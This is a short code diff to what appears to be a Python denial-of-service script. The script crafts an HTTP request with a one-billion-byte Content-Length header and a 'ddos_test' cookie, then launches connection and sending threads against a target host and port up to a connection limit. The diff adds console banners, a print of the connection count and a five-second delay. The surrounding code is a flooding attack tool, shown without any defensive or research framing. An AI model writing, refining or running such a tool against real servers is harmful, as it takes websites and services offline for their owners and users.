@@ -69,8 +69,14 @@ def main():
             "Content-Length: 1000000000\r\n"
             "Cookie: ddos_test\r\n"
              "\r\n" % (PAGE, HOST))
+    print("****************************")
+    print("****************************")
     print(data)
+    print("MAX_CONN={0}".format(MAX_CONN))
+    print("****************************")
+    print("****************************")
     data2 = data.encode('utf-8')
+    time.sleep(5)
     conn_th=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))
     send_th=threading.Thread(target=send_thread,args=())
     conn_th.start()
